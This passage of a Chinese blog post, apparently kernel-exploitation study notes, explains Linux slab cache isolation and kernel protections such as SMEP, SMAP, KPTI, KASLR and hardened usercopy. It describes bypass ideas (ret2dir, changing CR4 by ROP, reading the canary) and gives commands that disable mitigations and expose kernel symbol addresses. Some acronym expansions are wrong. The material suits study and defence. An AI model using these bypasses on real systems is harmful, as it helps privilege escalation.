<h4 id="通用-kmalloc-flag">通用 kmalloc flag</h4>
<p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code>
是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个
<code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code></p>
<p>这两种 flag 的区别主要在于 <code>GFP_KERNEL_ACCOUNT</code> 比
<code>GFP_KERNEL</code>
多了一个属性——<strong>表示该对象与来自用户空间的数据相关联</strong>，因此我们可以看到诸如
<code>msg_msg</code>
、<code>pipe_buffer</code>、<code>sk_buff的数据包</code>
的分配使用的都是 <code>GFP_KERNEL_ACCOUNT</code> ，而
<code>ldt_struct</code> 、<code>packet_socket</code>
等与用户空间数据没有直接关联的结构体则使用 <code>GFP_KERNEL</code></p>
<p>在5.9 版本之前<code>GFP_KERNEL</code> 与
<code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a class="link" 
 href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792" >这个
commit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中取消了隔离机制，自内核版本 5.14 起，在 <a class="link" 
 href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552" >这个
commit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 当中又重新引入：</p>
<ul>
<li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel
而言（通常都是默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code>
进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为
<code>kmalloc-cg-\*</code></strong> ，从而导致使用这两种 flag 的 object
之间的隔离：</li>
</ul>
<h4 id="slab-alias">slab alias</h4>
<p>slab alias 机制是一种对同等/相近大小 object 的
<code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：当一个
<code>kmem_cache</code> 在创建时，若已经存在能分配相等/近似大小的 object
的 <code>kmem_cache</code> ，则<strong>不会创建新的
kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache
返回</strong>。</p>
<p>例如 <code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的
<code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为
<code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的
object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code>
中分配。</p>
<p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的
<code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code>
而非为原有的建立 alias，例如在新版的内核当中 <code>cred_jar</code> 与
<code>kmalloc-192</code> 便是两个独立的
<code>kmem_cache</code>，<strong>彼此之间互不干扰</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Account to memcg */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SLAB_ACCOUNT		((slab_flags_t __force)0x04000000U)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SLAB_ACCOUNT		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * initialise the credentials stuff</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="内核保护机制">内核保护机制</h2>
<h3 id="空间隔离相关">空间隔离相关</h3>
<h4 id="smep">SMEP</h4>
<p>管理模式执行保护（Superivisor Mode Access
Protection），禁止内核执行用户空间代码。当处理器处于<code>ring 0</code>模式，执行用户空间的代码会触发页错误。<code>Linux</code>下叫做<code>PXN</code>。
#### SMAP 管理模式访问保护（Supervisor Mode Access
Prevention），禁止内核访问用户地址空间，类似于<code>smep</code>。当处理器处于<code>ring 0</code>模式，访问用户空间的数据会触发页错误。<code>ARM</code>下叫做<code>PAN</code>（Privileged
Access Never）</p>
<ul>
<li>对于没有<code>SMAP/SMEP</code>的情况下把内核指针重定向到用户空间的利用方式称为<code>ret2usr</code>。</li>
<li>上面两种保护的绕过方法：
<ol type="1">
<li><code>physmap</code>是内核管理的一块非常大的连续的虚拟地址空间，为了提高效率，该地址空间和内存地址直接映射。内存地址相对<code>physmap</code>要小的多，导致了任何一个内存地址可以在<code>physmap</code>中找到对应的虚拟内存地址。我们知道用户空间的虚拟内存也会映射到内存地址，<strong>这就存在了连续虚拟内存地址映射到了同一个内存地址的情况</strong>。也就是说，我们在用户空间里创建的数据，<strong>代码就很有可能映射到<code>physmap</code>空间</strong>。那么在用户空间用<code>mmap()</code>将提权代码映射到内存，然后再在内核空间里找到其对应的副本，修改<code>IP</code>调到副本执行就可以了。因为<code>physmap</code>本身就在内核空间里，这种漏洞利用方式叫做<code>ret2dir</code>。</li>
<li><code>Intel</code>下系统根据<code>CR4</code>控制寄存器的第<code>20</code>位标识是否开启<code>SMEP</code>保护，若能够通过<code>kernel ROP</code>改变<code>CR4</code>寄存器的值便能够关闭<code>SMEP</code>保护，完成<code>SMEP-bypass</code>，接下来就可以重新<code>ret2usr</code>。</li>
</ol></li>
<li>关闭<code>SMEP</code>方法：修改<code>/etc/default/grub</code>文件中的<code>GRUB_CMDLINE_LINUX=</code>,加上<code>nosmep/nosmap/nokaslr</code>，然后<code>update-grub</code>就可以。
#### KPTI <code>KPTI</code>（Kernel PageTable
Isolation），内核页表隔离，进程页表隔离。进程地址空间被分成了内核地址空间和用户地址空间，内核地址都是共享的，用户空间只能单独使用。为了防止用户程序获取内核数据，可以让用户地址空间和内核地址空间使用两组页表集。<code>Windows</code>称为<code>KVA Shadow</code>。</li>
</ul>
<p>由于有<code>KPTI</code>保护，即使关闭了<code>smep</code>和<code>smap</code>，也不能执行<code>用户区间的代码</code>，只能读，原因如下：
不隔离不意味着完全相同，填充内核态页表项时，<code>KPTI</code>
会给页表项加上 <code>_PAGE_NX</code>
标志，以阻止执行内核态页表所映射用户地址空间的代码。在
<code>KAISER patch</code> 里把这一步骤叫
毒化（<code>poison</code>）。</p>
<p>检查方式：查看
<code>/sys/devices/system/cpu/vulnerabilities/*</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure></div>
<p><strong>注意，KPTI
只是不能执行用户空间代码，不代表不能访问用户空间数据，如果关闭 SMAP
即使开启 KPTI 也是可以访问用户数据的。</strong></p>
<p>在启动脚本中设置 <code>-append "... kpti=1 ..."</code>（或
<code>pti=on</code>）即可开启 KPTI ，另外还需要设置
<code>-cpu kvm64</code> 。 ### 地址相关 #### KASLR
内核地址空间布局随机化（Kernel Address Space Layout
Randomization），开启后，允许<code>kernel image</code>加载到<code>VMALLOC</code>区域的任何位置。
间在未开启KASLR保护机制时，内核代码段的基址为 0xffffffff81000000
，direct mapping area 的基址为 0xffff888000000000 。 #### FG_KASLR
FG-KASLR （Function Granular Kernel Address Space Layout
Randomization）：细粒度的kaslr，函数级别上的 KASLR 优化。
<strong>注意，该保护只是在代码段打乱顺序，在数据段偏移不变，例如
<code>commit_creds</code> 函数的偏移改变但是 <code>init_cred</code>
的偏移不变。</strong> #### MMAP_MIN_ADDR
内核空间和用户空间共享虚拟内存地址，因此需要防止用户空间 mmap 的内存从 0
开始，从而缓解空指针引用攻击。windows 系统从 win8
开始禁止在零页分配内存。从 linux 内核 2.6.22 开始可以使用 sysctl 设置
<code>mmap_min_addr</code> 来实现这一保护。 ### 信息相关 #### Dmesg
Restrictions
通过设置<code>/proc/sys/kernel/dmesg_restrict</code>为1，可以将<code>dmesg</code>输出的信息视为敏感信息（默认为0）
#### Kernel Address Display Restriction 内核提供控制变量
<code>/proc/sys/kernel/kptr_restrict</code> 用于控制内核的一些输出打印。
- <code>kptr_restrict == 2</code> :内核将符号地址打印为全 0 , root
和普通用户都没有权限. - <code>kptr_restrict == 1</code> : root
用户有权限读取,普通用户没有权限. - <code>kptr_restrict == 0</code> :
root 和普通用户都可以读取.
<code>/proc/kallsyms</code>的内容需要<code>root</code>权限才能查看，如果以非<code>root</code>用户权限查看将显示地址为<code>0</code></p>
<p><code>kallsyms</code>
抽取了内核用到的所有函数地址(全局的,静态的)和非栈数据变量地址,生成一个数据块,作为只读数据链接进
<code>kernel image</code> 。 要在内核中启用 <code>kallsyms</code>
功能,须设置 <code>CONFIG_KALLSYMS</code> 选项为 <code>y</code> ,如果要在
<code>kallsyms</code> 中包含全部符号信息,须设置
<code>CONFIG_KALLSYMS_ALL</code> 为 <code>y</code> 。
<code>kallsyms</code> 表位于 <code>/proc/kallsyms</code>
，<code>kernel</code> 中的 <code>mod_tree</code>
处存放着各个模块加载的地址.</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.kptr_restrict=0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置权限</span></span><br><span class="line">cat /proc/kallsyms</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出所有内核符号</span></span><br><span class="line">grep mod_tree /proc/kallsyms</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出各个模块加载的地址</span></span><br><span class="line">cat /proc/modules</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出系统中已经加载的模块及其地址</span></span><br><span class="line">grep _text /proc/kallsyms</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vmlinux加载地址</span></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a7779218e2c579413905c3686109f346.png"
                     
alt="在这里插入图片描述" 
                > ### 数据相关 #### HARDENED_USERCOPY hardened
usercopy
是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，主要检查拷贝过程中对内核空间中数据的读写是否会越界：</p>
<p>读取的数据长度是否超出源 object 范围 写入的数据长度是否超出目的
object 范围 不过这种保护 不适用于内核空间内的数据拷贝
，这也是目前主流的绕过手段</p>
<p>这一保护被用于在使用 <code>copy_to_user()</code> 与
<code>copy_from_user()</code> 等数据交换 API 时用
<code>__check_object_size</code> 检查是否越界。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Rejects incorrectly sized objects and objects that are to be copied</span></span><br><span class="line"><span class="comment"> * to/from userspace but do not fall entirely within the containing slab</span></span><br><span class="line"><span class="comment"> * cache&#x27;s usercopy region.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns NULL if check passes, otherwise const char * to name of cache</span></span><br><span class="line"><span class="comment"> * to indicate an error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_heap_object(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="keyword">struct</span> page *page,</span><br><span class="line">			 <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">	<span class="type">size_t</span> object_size;</span><br><span class="line"></span><br><span class="line">	ptr = kasan_reset_tag(ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Find object and usable object size. */</span></span><br><span class="line">	s = page-&gt;slab_cache;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Reject impossible pointers. */</span></span><br><span class="line">	<span class="keyword">if</span> (ptr &lt; page_address(page))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;SLUB object not in SLUB page?!&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">			       to_user, <span class="number">0</span>, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Find offset within object. */</span></span><br><span class="line">	offset = (ptr - page_address(page)) % s-&gt;size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust for redzone and reject if within the redzone. */</span></span><br><span class="line">	<span class="keyword">if</span> (kmem_cache_debug(s) &amp;&amp; s-&gt;flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (offset &lt; s-&gt;red_left_pad)</span><br><span class="line">			usercopy_abort(<span class="string">&quot;SLUB object in left red zone&quot;</span>,</span><br><span class="line">				       s-&gt;name, to_user, offset, n);</span><br><span class="line">		offset -= s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allow address range falling entirely within usercopy region. */</span></span><br><span class="line">	<span class="keyword">if</span> (offset &gt;= s-&gt;useroffset &amp;&amp;</span><br><span class="line">	    offset - s-&gt;useroffset &lt;= s-&gt;usersize &amp;&amp;</span><br><span class="line">	    n &lt;= s-&gt;useroffset - offset + s-&gt;usersize)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If the copy is still within the allocated object, produce</span></span><br><span class="line"><span class="comment">	 * a warning instead of rejecting the copy. This is intended</span></span><br><span class="line"><span class="comment">	 * to be a temporary method to find any missing usercopy</span></span><br><span class="line"><span class="comment">	 * whitelists.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	object_size = slab_ksize(s);</span><br><span class="line">	<span class="keyword">if</span> (usercopy_fallback &amp;&amp;</span><br><span class="line">	    offset &lt;= object_size &amp;&amp; n &lt;= object_size - offset) &#123;</span><br><span class="line">		usercopy_warn(<span class="string">&quot;SLUB object&quot;</span>, s-&gt;name, to_user, offset, n);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	usercopy_abort(<span class="string">&quot;SLUB object&quot;</span>, s-&gt;name, to_user, offset, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_HARDENED_USERCOPY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_heap_object</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">				     <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	page = virt_to_head_page(ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (PageSlab(page)) &#123;</span><br><span class="line">		<span class="comment">/* Check slab allocator for flags and size. */</span></span><br><span class="line">		__check_heap_object(ptr, n, page, to_user);</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Checks if a given pointer and length is contained by the current</span></span><br><span class="line"><span class="comment"> * stack frame (if possible).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns:</span></span><br><span class="line"><span class="comment"> *	NOT_STACK: not at all on the stack</span></span><br><span class="line"><span class="comment"> *	GOOD_FRAME: fully within a valid stack frame</span></span><br><span class="line"><span class="comment"> *	GOOD_STACK: fully on the stack (when can&#x27;t do frame-checking)</span></span><br><span class="line"><span class="comment"> *	BAD_STACK: error condition (invalid stack position or bad stack frame)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">int</span> <span class="title function_">check_stack_object</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *obj, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span> * <span class="type">const</span> <span class="built_in">stack</span> = task_stack_page(current);</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span> * <span class="type">const</span> stackend = <span class="built_in">stack</span> + THREAD_SIZE;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Object is not on the stack at all. */</span></span><br><span class="line">	<span class="keyword">if</span> (obj + len &lt;= <span class="built_in">stack</span> || stackend &lt;= obj)</span><br><span class="line">		<span class="keyword">return</span> NOT_STACK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Reject: object partially overlaps the stack (passing the</span></span><br><span class="line"><span class="comment">	 * the check above means at least one end is within the stack,</span></span><br><span class="line"><span class="comment">	 * so if this check fails, the other end is outside the stack).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (obj &lt; <span class="built_in">stack</span> || stackend &lt; obj + len)</span><br><span class="line">		<span class="keyword">return</span> BAD_STACK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check if object is safely within a valid frame. */</span></span><br><span class="line">	ret = arch_within_stack_frames(<span class="built_in">stack</span>, stackend, obj, len);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> GOOD_STACK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is this address range in the kernel text area? */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_kernel_text_object</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> ptr,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> textlow = (<span class="type">unsigned</span> <span class="type">long</span>)_stext;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> texthigh = (<span class="type">unsigned</span> <span class="type">long</span>)_etext;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> textlow_linear, texthigh_linear;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (overlaps(ptr, n, textlow, texthigh))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;kernel text&quot;</span>, <span class="literal">NULL</span>, to_user, ptr - textlow, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Some architectures have virtual memory mappings with a secondary</span></span><br><span class="line"><span class="comment">	 * mapping of the kernel text, i.e. there is more than one virtual</span></span><br><span class="line"><span class="comment">	 * kernel address that points to the kernel image. It is usually</span></span><br><span class="line"><span class="comment">	 * when there is a separate linear physical memory mapping, in that</span></span><br><span class="line"><span class="comment">	 * __pa() is not just the reverse of __va(). This can be detected</span></span><br><span class="line"><span class="comment">	 * and checked:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	textlow_linear = (<span class="type">unsigned</span> <span class="type">long</span>)lm_alias(textlow);</span><br><span class="line">	<span class="comment">/* No different mapping: we&#x27;re done. */</span></span><br><span class="line">	<span class="keyword">if</span> (textlow_linear == textlow)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check the secondary mapping... */</span></span><br><span class="line">	texthigh_linear = (<span class="type">unsigned</span> <span class="type">long</span>)lm_alias(texthigh);</span><br><span class="line">	<span class="keyword">if</span> (overlaps(ptr, n, textlow_linear, texthigh_linear))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;linear kernel text&quot;</span>, <span class="literal">NULL</span>, to_user,</span><br><span class="line">			       ptr - textlow_linear, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">    check_bogus_address</span><br><span class="line">    check_stack_object</span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">	check_heap_object(ptr, n, to_user);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;bypass_usercopy_checks))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Skip all tests if size is zero. */</span></span><br><span class="line">	<span class="keyword">if</span> (!n)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for invalid addresses. */</span></span><br><span class="line">	check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for bad stack object. */</span></span><br><span class="line">	<span class="keyword">switch</span> (check_stack_object(ptr, n)) &#123;</span><br><span class="line">	<span class="keyword">case</span> NOT_STACK:</span><br><span class="line">		<span class="comment">/* Object is not touching the current process stack. */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> GOOD_FRAME:</span><br><span class="line">	<span class="keyword">case</span> GOOD_STACK:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Object is either in the correct frame (when it</span></span><br><span class="line"><span class="comment">		 * is possible to check) or just generally on the</span></span><br><span class="line"><span class="comment">		 * process stack (when frame checking not available).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		usercopy_abort(<span class="string">&quot;process stack&quot;</span>, <span class="literal">NULL</span>, to_user, <span class="number">0</span>, n);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">	check_heap_object(ptr, n, to_user);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for object in kernel to avoid text exposure. */</span></span><br><span class="line">	check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span><br><span class="line">					<span class="type">bool</span> to_user);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">					      <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__builtin_constant_p(n))</span><br><span class="line">		__check_object_size(ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">				     <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_HARDENED_USERCOPY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">bool</span></span><br><span class="line"><span class="title function_">check_copy_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr, <span class="type">size_t</span> bytes, <span class="type">bool</span> is_source)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> sz = __compiletime_object_size(addr);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(sz &gt;= <span class="number">0</span> &amp;&amp; sz &lt; bytes)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!__builtin_constant_p(bytes))</span><br><span class="line">			copy_overflow(sz, bytes);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (is_source)</span><br><span class="line">			__bad_copy_from();</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			__bad_copy_to();</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	check_object_size(addr, bytes, is_source);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">unsigned</span> <span class="type">long</span> __must_check</span><br><span class="line"><span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (likely(check_copy_size(from, n, <span class="literal">true</span>)))</span><br><span class="line">		n = _copy_to_user(to, from, n);</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="static_usermodehelper">STATIC_USERMODEHELPER</h4>
<p>禁掉了对于 <code>modprobe_path</code> 和 <code>core_pattern</code>
的利用（只读区域） ### 栈相关 #### STACK PROTECTOR
类似于用户态程序的canary，通常又被称作是 stack
cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生
<code>kernel panic</code> 。 <strong>开启：</strong>
在编译内核时，我们可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护。
<strong>关闭：</strong> 我们需要重新编译内核，并关闭编译选项才可以关闭
Canary 保护。
<strong>内核中的<code>canary</code>的值通常取自<code>gs</code>段寄存器某个固定偏移处的值,可以直接绕过。</strong>
### 堆相关 #### SLAB_FREELIST_HARDENED
<code>CONFIG_SLAB_FREELIST_HARDENED=y</code> 编译选项开启 Hardened
freelist 保护。 在这个配置下，<code>kmem_cache</code> 增加了一个变量
<code>random</code> 。在 <code>mm/slub.c</code> 文件，
<code>kmem_cache_open</code> 的时候给 <code>random</code>
字段一个随机数。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div> <code>set_freepointer</code>
函数中加了一个 <code>BUG_ON</code> 的检查，这里是检查 double free
的，当前 free 的 object 的内存地址和 freelist 指向的第一个 object
